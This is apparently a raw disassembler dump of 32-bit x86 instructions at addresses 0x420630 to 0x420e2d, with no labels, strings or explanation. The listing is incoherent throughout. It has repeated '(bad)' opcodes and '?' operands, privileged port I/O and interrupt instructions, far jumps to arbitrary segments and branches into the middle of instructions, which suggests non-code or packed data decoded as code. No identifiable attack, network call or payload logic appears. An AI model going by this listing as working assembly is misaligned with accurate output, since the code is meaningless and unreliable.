  420630:	and    DWORD PTR [edx+0x102af5be],esi
  420636:	xchg   esi,eax
  420637:	dec    eax
  420638:	pop    ecx
  420639:	das    
  42063a:	ret    
  42063b:	mov    edx,0x45f37604
  420640:	cld    
  420641:	pop    ss
  420642:	into   
  420643:	loopne 0x4205fb
  420645:	sbb    al,0xde
  420647:	mov    dh,BYTE PTR [ecx+ebp*1-0x74]
  42064b:	sbb    al,0xd1
  42064d:	or     eax,ebp
  42064f:	ror    dh,cl
  420651:	jmp    0x4205f2
  420653:	xor    DWORD PTR [eax+0x2e855454],esi
  420659:	xor    dh,BYTE PTR [ecx+0x3f9b75f8]
  42065f:	arpl   WORD PTR [edx+0x2a7cc4b8],bx
  420665:	ret    
  420666:	pushf  
  420667:	adc    esi,0xf8b33a85
  42066d:	retf   0x584
  420670:	sub    bl,BYTE PTR [edi]
  420672:	and    BYTE PTR [esi+ecx*8],0x1f
  420676:	gs dec ebp
  420678:	push   ss
  420679:	imul   ebx,DWORD PTR [ebp+ebx*2+0x4],0xffffff9f
  42067e:	dec    ebx
  42067f:	pop    edx
  420680:	pop    eax
  420681:	lahf   
  420682:	dec    edi
  420683:	std    
  420684:	enter  0xee1c,0xd2
  420688:	mov    ds:0x890119e0,eax
  42068d:	(bad)  
  42068e:	enter  0x83ac,0x54
  420692:	(bad)
  420695:	sar    eax,0x4b
  420698:	xchg   ebx,eax
  420699:	call   0x7a47:0xa9d0a3f7
  4206a0:	or     eax,0xd125159c
  4206a5:	repz pop ebp
  4206a7:	sbb    ebp,ebx
  4206a9:	scas   al,BYTE PTR es:[edi]
  4206aa:	jl     0x4206f9
  4206ac:	push   ss
  4206ad:	push   0x7296534b
  4206b2:	push   es
  4206b3:	jo     0x420728
  4206b5:	lods   eax,DWORD PTR ds:[esi]
  4206b6:	sbb    ah,cl
  4206b8:	mov    ebp,0xe0cbcdf5
  4206bd:	push   0xffffff8f
  4206bf:	test   BYTE PTR [ecx-0x53af7ba4],dh
  4206c5:	pop    esi
  4206c6:	or     al,0x85
  4206c8:	retf   
  4206c9:	xchg   ebp,eax
  4206ca:	jno    0x42065a
  4206cc:	and    DWORD PTR [ebx],ebp
  4206ce:	sub    al,0x3
  4206d0:	dec    ebx
  4206d1:	mov    esi,0xe36f9331
  4206d6:	xchg   ecx,eax
  4206d7:	imul   edx,DWORD PTR ds:0x21974c3a,0x1996534e
  4206e1:	cmp    bh,BYTE PTR [edx-0x5f3c06b3]
  4206e7:	into   
  4206e8:	ins    BYTE PTR es:[edi],dx
  4206e9:	mov    dl,0x9c
  4206eb:	int    0x57
  4206ed:	les    eax,FWORD PTR [esi+edi*8-0x59524da9]
  4206f4:	aaa    
  4206f5:	pop    ebp
  4206f6:	xchg   esp,eax
  4206f7:	fs inc eax
  4206f9:	push   cs
  4206fa:	mov    edx,0x7c4cf99b
  4206ff:	icebp  
  420700:	mov    cl,0x6a
  420702:	pop    edx
  420703:	in     eax,dx
  420704:	mov    al,0xfd
  420706:	mov    dl,0x1b
  420708:	push   ecx
  420709:	jne    0x420717
  42070b:	pusha  
  42070c:	push   ss
  42070d:	mov    es,eax
  42070f:	sbb    DWORD PTR [esi+0x53],eax
  420712:	sbb    DWORD PTR [eax+eiz*1-0x4],0xdd24972a
  42071a:	mov    eax,0xf2b3e820
  42071f:	fld    DWORD PTR ds:0xa170b059
  420725:	stos   DWORD PTR es:[edi],eax
  420726:	sti    
  420727:	out    dx,eax
  420728:	sbb    BYTE PTR [ebx],0xf
  42072b:	loop   0x4206dd
  42072d:	add    DWORD PTR [edx],eax
  42072f:	add    eax,0xacff94a1
  420734:	arpl   si,dx
  420736:	je     0x420770
  420738:	out    0x7b,eax
  42073a:	mov    WORD PTR es:[edx],cs
  42073d:	pushf  
  42073e:	mov    WORD PTR [edi+0x6a],?
  420741:	and    al,0x43
  420743:	inc    eax
  420744:	dec    esi
  420745:	dec    ecx
  420746:	pop    ebp
  420747:	jo     0x420793
  420749:	push   ss
  42074a:	imul   esp,esi,0xffffffa5
  42074d:	mov    bl,BYTE PTR [esp+ebp*2+0x7de922b]
  420754:	das    
  420755:	push   ss
  420756:	add    eax,0x577a9a05
  42075b:	cdq    
  42075c:	loope  0x42078c
  42075e:	stos   DWORD PTR es:[edi],eax
  42075f:	inc    ebp
  420760:	push   esp
  420761:	loopne 0x42070b
  420763:	pop    esp
  420764:	mov    dl,0x7c
  420766:	mov    esi,0x7b0b4fd4
  42076b:	xchg   esi,eax
  42076c:	call   0x1720:0x2880ab9e
  420773:	pop    ss
  420774:	popf   
  420775:	mov    bh,0x36
  420777:	fisttp QWORD PTR [edi]
  420779:	retf   
  42077a:	add    al,0xf5
  42077c:	jb     0x42073d
  42077e:	punpckldq mm1,DWORD PTR [edx+eax*8-0x3f921b17]
  420786:	inc    esi
  420787:	xchg   BYTE PTR [ebx+0x1a33f7ec],bh
  42078d:	push   ss
  42078e:	in     al,0x9e
  420790:	mov    esp,0xc6fe8063
  420795:	xchg   edx,edx
  420797:	mov    al,ds:0xde6cc7ff
  42079c:	pusha  
  42079d:	jnp    0x4207f0
  42079f:	jno    0x4207a5
  4207a1:	xor    cl,BYTE PTR [ebx-0x2403583]
  4207a7:	sub    esp,DWORD PTR [ebx-0x32]
  4207aa:	outs   dx,DWORD PTR ds:[esi]
  4207ab:	jo     0x4207c9
  4207ad:	sbb    edx,0xce23e1fe
  4207b3:	fwait
  4207b4:	mov    al,0x24
  4207b6:	mov    al,ds:0xd809315c
  4207bb:	or     ebp,eax
  4207bd:	jle    0x4207ed
  4207bf:	jl     0x420813
  4207c1:	mov    al,ds:0x4da329b8
  4207c6:	xchg   DWORD PTR [ebx],edx
  4207c8:	and    cl,dl
  4207ca:	call   edi
  4207cc:	xchg   esp,eax
  4207cd:	in     eax,0xd7
  4207cf:	lea    edx,ds:0x6f745ce3
  4207d5:	cmp    BYTE PTR [eax-0x43f07665],cl
  4207db:	push   ebp
  4207dc:	add    edi,DWORD PTR [eax]
  4207de:	xor    ecx,eax
  4207e0:	pop    ebp
  4207e1:	mov    bl,0xb9
  4207e3:	adc    bh,BYTE PTR [ebp+0x755a950f]
  4207e9:	lds    ebx,FWORD PTR [ebx]
  4207eb:	xchg   BYTE PTR [ecx-0x182574d6],bh
  4207f1:	(bad)  [ebx]
  4207f3:	retf   0x3975
  4207f6:	add    DWORD PTR [eax+ecx*4],ebp
  4207f9:	mov    cl,0xab
  4207fb:	cwde   
  4207fc:	xor    DWORD PTR ds:0xbefa7c30,edx
  420802:	cwde   
  420803:	mov    eax,ds:0x99770cb4
  420808:	jb     0x4207da
  42080a:	js     0x42083f
  42080c:	es std 
  42080e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42080f:	sbb    al,0x8d
  420811:	inc    edx
  420812:	dec    esp
  420813:	stos   BYTE PTR es:[edi],al
  420814:	or     BYTE PTR [edx],0xff
  420817:	in     al,dx
  420818:	or     al,0x7f
  42081a:	les    ecx,FWORD PTR ds:0x2bc77ef4
  420820:	das    
  420821:	or     esi,DWORD PTR [eax-0x54]
  420824:	or     edi,ebp
  420826:	sub    dh,al
  420828:	inc    edx
  420829:	add    al,0xa4
  42082b:	fisub  DWORD PTR [eax-0x1323e9d2]
  420831:	stos   BYTE PTR es:[edi],al
  420832:	cmp    DWORD PTR [eax+eiz*2-0x6dda5c36],ebp
  420839:	mov    al,ds:0x55e9398a
  42083e:	adc    al,0xf0
  420840:	xor    BYTE PTR [edx-0x7d],ah
  420843:	mov    gs,WORD PTR [eax-0x4eeb1941]
  420849:	jl     0x420850
  42084b:	xor    BYTE PTR [ecx+0x13],0x60
  42084f:	jne    0x4208c5
  420851:	fst    DWORD PTR [ebx+0x2c93ad44]
  420857:	push   eax
  420858:	xchg   BYTE PTR [eax+0x27c13024],cl
  42085e:	je     0x4208dc
  420860:	mov    esi,0xf4f2e3d2
  420865:	inc    BYTE PTR [esi]
  420867:	xor    BYTE PTR [esi-0x193e168b],al
  42086d:	jle    0x4208e0
  42086f:	repnz mov ch,0xc6
  420872:	add    BYTE PTR [edx-0x2],0x9d
  420876:	inc    edi
  420877:	(bad)  
  420878:	nop
  420879:	imul   edi,DWORD PTR [ebp-0x520d9c61],0x33a416f
  420883:	aad    0xc0
  420885:	into   
  420886:	jmp    0x8f19:0x6bf2598
  42088d:	xor    eax,edx
  42088f:	retf   0x6f9d
  420892:	mov    ?,WORD PTR [ecx]
  420894:	ret    0x4b48
  420897:	mov    ecx,0xbe875e7e
  42089c:	push   0x61
  42089e:	sub    DWORD PTR [ebx],eax
  4208a0:	sbb    al,0x1c
  4208a2:	daa    
  4208a3:	scas   eax,DWORD PTR es:[edi]
  4208a4:	jno    0x420866
  4208a6:	jmp    0xb84276be
  4208ab:	mov    ?,edi
  4208ad:	icebp  
  4208ae:	xor    al,0x19
  4208b0:	push   esp
  4208b1:	dec    eax
  4208b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208b3:	mov    bl,0xbc
  4208b5:	fstp   DWORD PTR [ebp-0x795f754c]
  4208bb:	xor    edi,ebp
  4208bd:	jle    0x4208d9
  4208bf:	add    al,0xd3
  4208c1:	std    
  4208c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208c3:	mov    ebp,0x2c41f84
  4208c8:	mov    ah,0x15
  4208ca:	retf   0xd129
  4208cd:	adc    cl,ch
  4208cf:	add    BYTE PTR [edi+0x7afb4852],0x38
  4208d6:	xor    eax,DWORD PTR [edi]
  4208d8:	add    BYTE PTR [ebx],ah
  4208da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208db:	(bad)  
  4208dc:	mov    eax,DWORD PTR [edi]
  4208de:	scas   al,BYTE PTR es:[edi]
  4208df:	ss inc ebp
  4208e1:	dec    esp
  4208e2:	inc    esi
  4208e3:	ret    0x6d08
  4208e6:	or     DWORD PTR [esi],esp
  4208e8:	jae    0x420918
  4208ea:	add    BYTE PTR [esi],al
  4208ec:	adc    al,0xa
  4208ee:	cs mov ch,0xed
  4208f1:	push   es
  4208f2:	xchg   edx,eax
  4208f3:	scas   eax,DWORD PTR es:[edi]
  4208f4:	jnp    0x42089f
  4208f6:	mov    dl,0xb1
  4208f8:	lea    ebx,[ecx+0x6dfd0c8]
  4208fe:	je     0x420960
  420900:	add    BYTE PTR [esi+0x172e84b8],bh
  420906:	packsswb mm0,mm7
  420909:	lea    edi,[edi+0x67]
  42090c:	mov    BYTE PTR [esi-0x6f354683],ah
  420912:	ror    BYTE PTR [ecx+0x4c],cl
  420915:	push   esi
  420916:	or     cl,BYTE PTR es:[ebx-0x51]
  42091a:	push   ss
  42091b:	mov    ah,0x50
  42091d:	add    esi,esi
  42091f:	dec    esp
  420920:	xor    BYTE PTR [eax-0x41],0x50
  420924:	push   es
  420925:	push   esp
  420926:	or     eax,0x6c
  420929:	jnp    0x420972
  42092b:	mov    esp,0x2c65ab73
  420930:	or     bl,dl
  420932:	mov    edi,0xf2e31d96
  420937:	lea    esi,[ebx]
  420939:	xchg   esi,eax
  42093a:	mov    dl,0x16
  42093c:	add    bh,BYTE PTR [eax]
  42093e:	cmp    ch,BYTE PTR [edx+esi*8+0x23]
  420942:	lock loope 0x4209ae
  420945:	dec    esp
  420946:	and    bh,BYTE PTR [ebp+0x69]
  420949:	jns    0x420900
  42094b:	inc    ebp
  42094c:	push   ds
  42094d:	xchg   BYTE PTR [edi-0x5d0639c0],ah
  420953:	mov    ds:0x2f066a50,eax
  420958:	fs cmp esi,esi
  42095b:	nop
  42095c:	stos   DWORD PTR es:[edi],eax
  42095d:	jg     0x4208f3
  42095f:	push   ebp
  420960:	jne    0x4209d7
  420962:	pop    ebp
  420963:	inc    ebp
  420964:	gs pushf 
  420966:	push   cs
  420967:	daa    
  420968:	or     DWORD PTR [esi+0x151135be],0x68
  42096f:	mov    esi,0x7112b996
  420974:	cmp    ebp,edx
  420976:	std    
  420977:	lock stc 
  420979:	mov    dh,0xf8
  42097b:	sbb    DWORD PTR [edx+0x29],0x1a
  42097f:	push   edx
  420980:	repnz mov bh,0xbc
  420983:	jns    0x4209a9
  420985:	popf   
  420986:	fcomp  DWORD PTR [edx-0x4f]
  420989:	sahf   
  42098a:	mov    edx,0x77f01fb7
  42098f:	mov    DWORD PTR [ecx-0x71b33b5a],ecx
  420995:	addr16 jl 0x420948
  420998:	icebp  
  420999:	arpl   WORD PTR [ebx+0x6c],bp
  42099c:	scas   al,BYTE PTR es:[edi]
  42099d:	xchg   ecx,esi
  42099f:	mov    eax,ds:0xe637c1e0
  4209a4:	mov    edi,DWORD PTR [ecx]
  4209a6:	sahf   
  4209a7:	iret   
  4209a8:	lods   eax,DWORD PTR fs:[esi]
  4209aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209ab:	js     0x4209c2
  4209ad:	or     BYTE PTR [edi+0x19],bl
  4209b0:	repz adc DWORD PTR [ecx],ecx
  4209b3:	je     0x4209e2
  4209b5:	test   eax,0xf011b6
  4209ba:	dec    ecx
  4209bb:	xchg   edi,eax
  4209bc:	loopne 0x420975
  4209be:	mov    al,0xb0
  4209c0:	test   BYTE PTR [eax+0x8cc151b],ch
  4209c6:	mov    edx,0x68899cd8
  4209cb:	sub    cl,cl
  4209cd:	in     al,dx
  4209ce:	jb     0x420971
  4209d0:	imul   edx,edi,0xef6cc4a5
  4209d6:	xchg   DWORD PTR [eax-0x64],edx
  4209d9:	jno    0x42099b
  4209db:	push   0xfffffff6
  4209dd:	lea    edi,[edi-0x6e]
  4209e0:	add    eax,DWORD PTR [ebx-0x562aec88]
  4209e6:	rcl    BYTE PTR [ebx-0x72],1
  4209e9:	and    DWORD PTR ds:0xf9f929d8,esp
  4209ef:	push   ebp
  4209f0:	out    0x78,al
  4209f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209f3:	lods   al,BYTE PTR ds:[esi]
  4209f4:	adc    cl,ch
  4209f6:	mov    WORD PTR [eax+0x4b9537b3],gs
  4209fc:	jae    0x4209cb
  4209fe:	into   
  4209ff:	and    ch,BYTE PTR [esi]
  420a01:	jo     0x420a6d
  420a03:	fist   WORD PTR ds:0x4aa84f0b
  420a0a:	xchg   edx,eax
  420a0b:	sbb    al,0x5d
  420a0d:	fst    DWORD PTR [ebx]
  420a0f:	ss xchg ecx,eax
  420a11:	mov    cs,WORD PTR [ecx+0x7f0b5f56]
  420a17:	sbb    DWORD PTR [ebp-0x7c],0xffffff98
  420a1b:	sbb    DWORD PTR [edi+0x17b3c684],edx
  420a21:	add    ch,BYTE PTR ds:[esi-0x3d]
  420a25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a26:	push   DWORD PTR [ebx]
  420a28:	xor    dl,BYTE PTR [ebp-0x6ab29f3c]
  420a2e:	pop    ebp
  420a2f:	cli    
  420a30:	xor    al,0x40
  420a32:	and    al,0x44
  420a34:	dec    ebp
  420a35:	push   ecx
  420a36:	xor    bh,BYTE PTR [edx+0x5f71e15d]
  420a3c:	fcomp  QWORD PTR [eax]
  420a3e:	iret   
  420a3f:	ja     0x420a19
  420a41:	xchg   ecx,eax
  420a42:	loope  0x420a95
  420a44:	loopne 0x4209f5
  420a46:	mov    esi,0x4b5da4c6
  420a4b:	jbe    0x420ac4
  420a4d:	sub    eax,0xb407e9c7
  420a52:	cmp    DWORD PTR [esi+0x1e],0xb9ce348a
  420a59:	mov    dh,0xbb
  420a5b:	into   
  420a5c:	pop    ss
  420a5d:	push   es
  420a5e:	(bad)  
  420a5f:	jp     0x420a72
  420a61:	dec    edx
  420a62:	adc    bh,BYTE PTR [edi*1-0x5f26227]
  420a69:	or     cl,bl
  420a6b:	cmp    BYTE PTR [eax+0x6e037f8d],0xfc
  420a72:	inc    eax
  420a73:	mov    ch,0xad
  420a75:	push   0x7671b5c3
  420a7a:	cmp    al,0x26
  420a7c:	mov    cs,ebx
  420a7e:	mov    eax,0xc6939ef4
  420a83:	dec    ecx
  420a84:	int3   
  420a85:	mov    bh,0x9f
  420a87:	sub    ebp,DWORD PTR [edx+eiz*2+0x28]
  420a8b:	into   
  420a8c:	retf   
  420a8d:	adc    al,0xb2
  420a8f:	mov    ch,0xbe
  420a91:	sub    BYTE PTR [edi],al
  420a93:	jecxz  0x420a3e
  420a95:	or     eax,0xc96f277c
  420a9a:	dec    ebx
  420a9b:	popf   
  420a9c:	push   eax
  420a9d:	and    DWORD PTR [edi],ebp
  420a9f:	pop    eax
  420aa0:	call   0x8bc2:0x5bbc38f2
  420aa7:	es dec ebx
  420aa9:	mov    esp,0x27b3e4ce
  420aae:	lahf   
  420aaf:	push   cs
  420ab0:	addr16 icebp 
  420ab2:	shr    al,1
  420ab4:	arpl   WORD PTR [ecx+0x11],sp
  420ab7:	fwait
  420ab8:	xchg   esp,eax
  420ab9:	pop    es
  420aba:	cmp    dh,ch
  420abc:	inc    ebx
  420abd:	mov    bh,0x3b
  420abf:	adc    BYTE PTR [ebp-0x6f25424f],bh
  420ac5:	sbb    ecx,DWORD PTR [ebp+0x5e]
  420ac8:	rcl    BYTE PTR [ecx-0x6ea8bd36],1
  420ace:	push   ebx
  420acf:	add    DWORD PTR [edi+ebp*2-0x7f],edx
  420ad3:	pop    edi
  420ad4:	sbb    bl,BYTE PTR [ebx+ebx*4+0x4719c052]
  420adb:	pop    edi
  420adc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420add:	and    ebx,DWORD PTR [eax]
  420adf:	xor    eax,DWORD PTR [ebx+esi*4+0x1]
  420ae3:	xchg   edx,eax
  420ae4:	push   ebp
  420ae5:	arpl   WORD PTR [ebp+0x71],bx
  420ae8:	jmp    0x8456363e
  420aed:	adc    al,BYTE PTR [ecx-0x41]
  420af0:	xchg   ecx,eax
  420af1:	cmp    eax,0xe1884b0f
  420af6:	pusha  
  420af7:	mov    ebx,0xe3070d4f
  420afc:	icebp  
  420afd:	push   esi
  420afe:	inc    esi
  420aff:	mov    edx,0x5a1b14dc
  420b04:	jle    0x420ac8
  420b06:	aas    
  420b07:	dec    esp
  420b08:	jb     0x420b05
  420b0a:	out    0xac,eax
  420b0c:	mov    eax,ds:0xae4b2102
  420b11:	add    eax,0x8e23c054
  420b16:	stos   DWORD PTR es:[edi],eax
  420b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b18:	sbb    BYTE PTR ds:0x33d94c8a,dl
  420b1e:	loop   0x420afe
  420b20:	xor    eax,0xedf0b6af
  420b25:	(bad)  
  420b26:	sub    esi,DWORD PTR [edx]
  420b28:	dec    ebx
  420b29:	rol    BYTE PTR [eax-0x1d19d9c2],1
  420b2f:	es inc esi
  420b31:	pop    ds
  420b32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b33:	fnstsw WORD PTR ds:[edi+0x63]
  420b37:	xor    bl,BYTE PTR [edx-0x53ec8486]
  420b3d:	fistp  DWORD PTR [esi+0x6c]
  420b40:	out    dx,eax
  420b41:	mov    eax,0xb5b35f3f
  420b46:	inc    ebp
  420b47:	jo     0x420b3c
  420b49:	xor    esp,DWORD PTR [eax+0x1f]
  420b4c:	xchg   BYTE PTR [edi+0x5],dh
  420b4f:	lods   al,BYTE PTR ds:[esi]
  420b50:	les    eax,FWORD PTR [eax+0x5269742d]
  420b56:	mov    al,ds:0xe03ef0cc
  420b5b:	or     BYTE PTR [edx-0x58f1d80],ah
  420b61:	mov    al,BYTE PTR [edx+0x61]
  420b64:	xor    bh,BYTE PTR [edi-0x1dbfc7d2]
  420b6a:	ds mov esi,0xa6e2105e
  420b70:	cmp    edx,edi
  420b72:	(bad)  [ebp+0x5f]
  420b75:	pop    esp
  420b76:	xchg   esi,eax
  420b77:	pushf  
  420b78:	fsub   DWORD PTR [ebx+ebp*8-0x5d523376]
  420b7f:	inc    ebx
  420b80:	in     eax,0x63
  420b82:	mov    esp,0x62a9f492
  420b87:	or     al,0xab
  420b89:	fild   QWORD PTR [ecx-0x47c69d09]
  420b8f:	fwait
  420b90:	jae    0x420b35
  420b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b93:	sub    edx,DWORD PTR [ecx+0x27]
  420b96:	mov    bh,0xa3
  420b98:	(bad)  
  420b99:	iret   
  420b9a:	push   esp
  420b9b:	(bad)  
  420b9c:	call   DWORD PTR [edx-0x5e]
  420b9f:	cmp    DWORD PTR [ebp+ebx*4-0x65],edi
  420ba3:	(bad)  
  420ba4:	fcom   DWORD PTR [esi]
  420ba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ba7:	inc    esi
  420ba8:	fwait
  420ba9:	aaa    
  420baa:	test   DWORD PTR ds:[ebx],ebp
  420bad:	xchg   edi,eax
  420bae:	out    dx,eax
  420baf:	outs   dx,DWORD PTR ds:[esi]
  420bb0:	ret    
  420bb1:	std    
  420bb2:	fsub   st(1),st
  420bb4:	mov    cl,0xaf
  420bb6:	mov    ah,0x54
  420bb8:	mov    ds:0xcb524613,eax
  420bbd:	push   ss
  420bbe:	mov    ch,0x2a
  420bc0:	pop    ds
  420bc1:	push   eax
  420bc2:	inc    edi
  420bc3:	jge    0x420c42
  420bc5:	mov    esp,0xdc147b19
  420bca:	fcom   DWORD PTR [esi+ebp*4+0x35b82726]
  420bd1:	test   DWORD PTR [ebp+0x56],ebx
  420bd4:	xor    eax,0xb8a3110c
  420bd9:	add    eax,0x58844a4b
  420bde:	shl    BYTE PTR ds:[edx+0x76],cl
  420be2:	frstor [edi]
  420be4:	dec    ecx
  420be5:	cdq    
  420be6:	mov    cs,ebp
  420be8:	inc    ecx
  420be9:	sub    ch,bl
  420beb:	aam    0xd
  420bed:	inc    ebp
  420bee:	cmp    DWORD PTR [edi-0x78],esi
  420bf1:	dec    edx
  420bf2:	mov    al,ds:0x8f347964
  420bf7:	sub    eax,0x6d55a485
  420bfc:	sub    BYTE PTR [eax+0x503538aa],cl
  420c02:	push   ds
  420c03:	iret   
  420c04:	dec    esi
  420c05:	aam    0x5a
  420c07:	cs dec ecx
  420c09:	jmp    0x9c7aaddb
  420c0e:	js     0x420ba6
  420c10:	hlt    
  420c11:	xor    bh,BYTE PTR [eax-0x31]
  420c14:	ins    DWORD PTR es:[edi],dx
  420c15:	cli    
  420c16:	mov    ah,0x59
  420c18:	jns    0x420c99
  420c1a:	test   edx,0x130ae987
  420c20:	push   0xffffffe0
  420c22:	and    esi,DWORD PTR [edx-0x43d84978]
  420c28:	adc    ecx,DWORD PTR [edi+ecx*2-0x37172992]
  420c2f:	jo     0x420bf0
  420c31:	or     DWORD PTR [edx],0xffffffa3
  420c34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c35:	or     dh,BYTE PTR [edx+0x152d1d2d]
  420c3b:	mov    dl,0xa9
  420c3d:	repz popa 
  420c3f:	ds dec edi
  420c41:	mov    ebx,0x38058e95
  420c46:	adc    BYTE PTR [edx+edx*2-0x62],ah
  420c4a:	arpl   WORD PTR [edi+0x5295c4fc],di
  420c50:	ins    DWORD PTR es:[edi],dx
  420c51:	jmp    0x32f2:0x5db323c9
  420c58:	call   0xc63c0a23
  420c5d:	rcr    BYTE PTR [eax-0x1187f070],0xaa
  420c64:	jmp    0x6b5d498d
  420c69:	inc    eax
  420c6a:	std    
  420c6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c6c:	sub    eax,0x376d73bc
  420c71:	push   esp
  420c72:	das    
  420c73:	cs lahf 
  420c75:	mov    dl,BYTE PTR [ecx]
  420c77:	add    eax,0xa5a9dbcb
  420c7c:	pop    edi
  420c7d:	mov    WORD PTR [ebx],ss
  420c7f:	jbe    0x420c31
  420c81:	mov    esp,0x2387db0d
  420c86:	std    
  420c87:	pop    esi
  420c88:	into   
  420c89:	scas   al,BYTE PTR es:[edi]
  420c8a:	sbb    eax,0x1cb4b402
  420c8f:	jmp    0xc33b:0x2c8b78e4
  420c96:	inc    BYTE PTR [ebp+0x18ce7377]
  420c9c:	cmp    eax,ecx
  420c9e:	or     BYTE PTR [edi+0x27ab5717],bl
  420ca4:	pop    ss
  420ca5:	cmp    ah,BYTE PTR [ecx+0x35]
  420ca8:	mov    bh,BYTE PTR [ebx+eax*2-0x5a]
  420cac:	pcmpeqb mm6,QWORD PTR ds:0x83e9ecee
  420cb3:	mov    esp,DWORD PTR [ebp+ebp*2-0x34adb8f1]
  420cba:	jns    0x420c82
  420cbc:	push   0xa7ce7117
  420cc1:	cli    
  420cc2:	push   ebp
  420cc3:	ins    BYTE PTR es:[edi],dx
  420cc4:	dec    ecx
  420cc5:	ret    
  420cc6:	fld    st(6)
  420cc8:	jl     0x420c73
  420cca:	pop    es
  420ccb:	hlt    
  420ccc:	test   eax,0xcef02db6
  420cd1:	pop    edi
  420cd2:	mov    eax,ds:0x7ceb26e1
  420cd7:	arpl   cx,cx
  420cd9:	aaa    
  420cda:	in     al,0x6c
  420cdc:	addr16 mov ebx,0x502b5be1
  420ce2:	xchg   edi,eax
  420ce3:	cdq    
  420ce4:	cdq    
  420ce5:	cmp    DWORD PTR [ebp+0x41968ef4],esi
  420ceb:	outs   dx,BYTE PTR ds:[esi]
  420cec:	mov    ch,dl
  420cee:	in     al,dx
  420cef:	loope  0x420d61
  420cf1:	add    esi,esp
  420cf3:	dec    ebx
  420cf4:	dec    ecx
  420cf5:	sub    eax,0x2861265f
  420cfa:	jle    0x420d1d
  420cfc:	stc    
  420cfd:	push   eax
  420cfe:	fs add eax,0x29b643db
  420d05:	ins    DWORD PTR es:[edi],dx
  420d06:	repz sbb eax,0x4f5490ec
  420d0c:	ret    0xf807
  420d0f:	jmp    0x6654:0xfafd275a
  420d16:	xor    al,0x7c
  420d18:	out    dx,eax
  420d19:	enter  0xd858,0x3e
  420d1d:	mov    bh,0xe6
  420d1f:	pushf  
  420d20:	(bad)  
  420d21:	push   cs
  420d22:	fistp  WORD PTR [ebx]
  420d24:	dec    edx
  420d25:	fprem  
  420d27:	jne    0x420d63
  420d29:	pop    eax
  420d2a:	push   ds
  420d2b:	adc    DWORD PTR [ebx],ecx
  420d2d:	lock push ebx
  420d2f:	ds je  0x420d8e
  420d32:	push   esi
  420d33:	push   esi
  420d34:	xchg   ebp,eax
  420d35:	fs push esp
  420d37:	adc    BYTE PTR [ebp-0x79c6c3b4],al
  420d3d:	xchg   edx,eax
  420d3e:	pop    ss
  420d3f:	les    ecx,FWORD PTR [ebx+0x176dd0ca]
  420d45:	ja     0x420d17
  420d47:	or     BYTE PTR [edi],al
  420d49:	cdq    
  420d4a:	mov    ss,esp
  420d4c:	addr16 (bad) 
  420d4e:	test   BYTE PTR [ecx-0x26],dh
  420d51:	popf   
  420d52:	gs nop
  420d54:	les    ebp,FWORD PTR [eax]
  420d56:	jns    0x420d63
  420d58:	adc    al,0xaf
  420d5a:	pop    esi
  420d5b:	sub    al,0x82
  420d5d:	or     ch,BYTE PTR [ecx+0x47]
  420d60:	jmp    0x420cf5
  420d62:	les    edx,FWORD PTR [edx+0x218c786c]
  420d68:	fsub   QWORD PTR [ebx]
  420d6a:	mov    ecx,0x2ba90d47
  420d6f:	lds    esi,FWORD PTR [edi+0x39]
  420d72:	add    ah,BYTE PTR [esi+ebx*2-0x19eb087d]
  420d79:	ret    0x190b
  420d7c:	sbb    eax,0x6925bfd0
  420d81:	sbb    eax,0xac40684f
  420d86:	add    DWORD PTR [ebx-0x129381fd],esp
  420d8c:	addr16 push 0x8deff2c5
  420d92:	xor    eax,0xebf860ef
  420d97:	jle    0x420dd7
  420d99:	(bad)  
  420d9a:	aad    0x13
  420d9c:	push   0x182453f5
  420da1:	mov    ds:0x580a0175,al
  420da6:	not    ah
  420da8:	inc    edi
  420da9:	cmp    DWORD PTR [eax-0x69b741bd],edx
  420daf:	inc    edx
  420db0:	push   ds
  420db1:	sahf   
  420db2:	inc    edx
  420db3:	ja     0x420dd7
  420db5:	stc    
  420db6:	ror    BYTE PTR gs:[esi+ecx*4+0x34d11e01],cl
  420dbe:	sbb    ebp,DWORD PTR [ecx-0x21edd12c]
  420dc4:	jns    0x420dd4
  420dc6:	pushf  
  420dc7:	xchg   ebp,eax
  420dc8:	arpl   WORD PTR [ecx],dx
  420dca:	cmp    eax,0x5613a6a0
  420dcf:	loop   0x420dfa
  420dd1:	jl     0x420da4
  420dd3:	ds cmc 
  420dd5:	and    al,0x4b
  420dd7:	cdq    
  420dd8:	sub    esi,DWORD PTR [ebx]
  420dda:	ja     0x420e3e
  420ddc:	add    cl,BYTE PTR [eax]
  420dde:	xchg   edx,eax
  420ddf:	push   ebx
  420de0:	jmp    0x420e0a
  420de2:	dec    edi
  420de3:	int3   
  420de4:	push   ds
  420de5:	outs   dx,BYTE PTR ds:[esi]
  420de6:	mov    dh,0xc0
  420de8:	out    0xb5,al
  420dea:	fsub   QWORD PTR [edx-0x70]
  420ded:	and    al,0x8
  420def:	imul   ebp,edi,0x56
  420df2:	fwait
  420df3:	test   al,0xf1
  420df5:	cli    
  420df6:	hlt    
  420df7:	sbb    BYTE PTR [esp+ecx*8],cl
  420dfa:	jae    0x420e3f
  420dfc:	repz sub eax,0xcd98d0d8
  420e02:	iret   
  420e03:	outs   dx,DWORD PTR ds:[esi]
  420e04:	scas   eax,DWORD PTR es:[edi]
  420e05:	imul   edx,DWORD PTR [ebp+0x7],0xe67f88e8
  420e0c:	add    DWORD PTR [edi-0x7adb670c],edx
  420e12:	mov    eax,ds:0x750949c3
  420e17:	shr    BYTE PTR [esi+0x30],1
  420e1a:	mov    BYTE PTR ds:0x145b9834,dl
  420e20:	bound  edi,QWORD PTR [edi-0x17bfcae2]
  420e26:	dec    eax
  420e27:	and    esp,esi
  420e29:	mov    cl,0x6a
  420e2b:	xchg   eax,ebp
  420e2d:	cmc    
